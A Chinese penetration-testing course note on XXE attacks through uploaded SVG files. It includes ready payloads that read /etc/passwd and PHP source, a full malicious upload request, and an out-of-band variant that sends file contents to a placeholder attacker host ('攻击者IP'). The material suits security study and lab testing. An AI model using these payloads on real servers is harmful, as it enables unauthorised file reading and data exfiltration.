---
title: XXE 的 SVG 载体
category: XXE/利用
tags: [XXE, SVG, 文件上传, 图片解析, OOB]
source: 课程笔记 2025-10-19
date: 2025-10-19
order: 6
---

## 一句话概括

**SVG 本质上是 XML 文件**，所以它同样支持 DTD 声明和外部实体。当服务器处理上传的 SVG（生成缩略图、校验合法性、读取尺寸）时，只要用的是不安全的 XML 解析器，XXE 就会被触发 —— 而且上传点看起来只是「传了张图」，防御方往往毫无察觉。

## 原理

### 1. SVG 就是 XML

**SVG（Scalable Vector Graphics，可缩放矢量图形）本质上是 XML 文件**，因此完全支持 XML 的所有功能，包括 DTD 声明和外部实体引用。当服务器处理上传的 SVG 文件时，如果使用不安全的 XML 解析器，就会触发 XXE 漏洞。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ ... ]>          <!-- SVG 允许 DOCTYPE -->
<svg xmlns="http://www.w3.org/2000/svg" ...>
    ...
</svg>
```

关键点在于：**没有任何地方规定「图片不能有 DTD」**。只要文件扩展名是 `.svg`、`Content-Type` 是 `image/svg+xml`，后端就会把它交给 XML 解析器；而解析器认的是 XML 语法，不是「这是不是图片」。

### 2. 为什么 SVG XXE 特别危险

1. **信任错觉**：开发者认为 SVG 只是「图片」，上传校验只查扩展名 / MIME
2. **广泛支持**：大多数 CMS、社交平台都支持 SVG 上传（头像、图标、水印）
3. **默认不安全**：很多图像处理库直接使用 XML 解析器处理 SVG
4. **绕过检测**：SVG 可以包含恶意代码但仍显示为正常图片

> 第 4 点值得展开：XXE 的 payload 是写在 `<!DOCTYPE>` 里的，而 `<!DOCTYPE>` **不参与渲染**。所以一个「带着恶意实体的 SVG」在浏览器里看起来和普通 SVG 完全一样 —— 图片正常显示，实体在服务端早已被解析执行。

### 3. 触发链路

```text
攻击者上传 .svg
      │
      ▼
后端文件校验（扩展名 / MIME：image/svg+xml）—— 通过
      │
      ▼
后端「处理」这个 SVG（读尺寸 / 生成缩略图 / 存库解析）
      │
      ▼
图像处理库调用 XML 解析器 → 解析到 &xxe; → 读取 file:///etc/passwd
      │
      ▼
（有回显则落进图片/页面；无回显则用 OOB 外带）
```

## 利用条件

1. **存在 SVG 上传功能**：头像、图标、流程图、图片素材
2. **服务端会解析 SVG**：只做存储不解析的话不会触发；必须存在「用 XML 解析器处理 SVG」的环节
3. **解析器允许外部实体**：同 XXE 通用条件（`LIBXML_NOENT`，PHP < 8.0 默认允许）
4. **要有出口**：
   - 有回显 → 直接用 `file://` 读文件
   - 无回显（渲染成图片后看不到文本）→ 改用**参数实体 OOB 外带**，或看响应里有没有解析报错信息

> **在渗透测试中，SVG 上传功能总是应该优先测试的 XXE 攻击面。**

## Payload 速查

| 目的 | Payload |
|---|---|
| 最简读文件 | 见下方「最简单的 SVG XXE Payload」 |
| 读 `/etc/passwd` | `<!ENTITY xxe SYSTEM "file:///etc/passwd">` |
| 读取 PHP 源码 | `<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/index.php">` |
| 无回显时探测（看回连） | `<!ENTITY xxe SYSTEM "http://攻击者IP/">` |
| OOB 外带 | `<!ENTITY % file SYSTEM "file:///etc/passwd">` + 拼 URL 的 `%send;`（见《XXE漏洞原理与判断》三件套） |

## 完整示例

### 最简单的 SVG XXE Payload

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
    <text>&xxe;</text>
</svg>
```

逐行解析：

- `<?xml version="1.0" encoding="UTF-8"?>` —— XML 声明，说明这是 XML 文档（而不是「纯图片」）
- `<!DOCTYPE svg [ ... ]>` —— 声明 DTD，定义外部实体 `xxe`，指向 `file:///etc/passwd`
- `<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">`
  - 标准的 SVG 根元素，声明命名空间和尺寸
  - **这看起来完全像一个正常的 SVG 图片**
- `<text>&xxe;</text>`
  - **这是攻击触发点！**
  - `&xxe;`：引用之前定义的实体
  - XML 处理器会在这里将 `&xxe;` 替换为 `/etc/passwd` 文件的内容
- `</svg>` —— 闭合 SVG 标签

### 上传请求

```http
POST /upload HTTP/1.1
Host: 靶机地址
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryX

------WebKitFormBoundaryX
Content-Disposition: form-data; name="file"; filename="evil.svg"
Content-Type: image/svg+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
    <text>&xxe;</text>
</svg>
------WebKitFormBoundaryX--
```

### 无回显时的替代写法

SVG 被渲染成图片后，`<text>` 里的内容可能根本不会传回给攻击者。这时改用**外带**，把文件内容拼到请求 URL 里：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % send SYSTEM "http://攻击者IP/?%file;">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
    <text>x</text>
</svg>
```

更稳的做法是配合远程 DTD（见《XXE漏洞原理与判断》的「盲 XXE 三件套」）：先把文件内容 base64 编码放进 `%file`，再拼进一个参数实体的 URL 里发出去。

## 踩坑与备注

- **上传成功 ≠ 触发成功**：很多系统只是把 SVG 原样存盘 + 回显，**根本没有解析过程**，这时 XXE 不会触发。判断方法是先用一个指向自己服务器的外部实体做探测，看有没有收到回连。
- **回显位置要盯渲染结果**：如果后端把 SVG 转成 PNG 再展示，`<text>` 里的文件内容会变成图片上的文字，肉眼能看也能 OCR；如果只返回「上传成功」，就只能走 OOB。
- **SVG 里的 `<text>` 不是唯一载体**：实体的值也可以放在属性里、放在 `<title>` 里，任何「会参与解析」的位置都行；只要能触发实体展开，放在哪不重要。
- **注意 MIME 与扩展名双重校验**：有些系统同时校验扩展名和 `Content-Type`，两边都要写成 SVG 的类型（`image/svg+xml`）。
- **本文把原笔记里出现的外部地址统一抽象为 `攻击者IP`**，实战替换成自己那台机器。
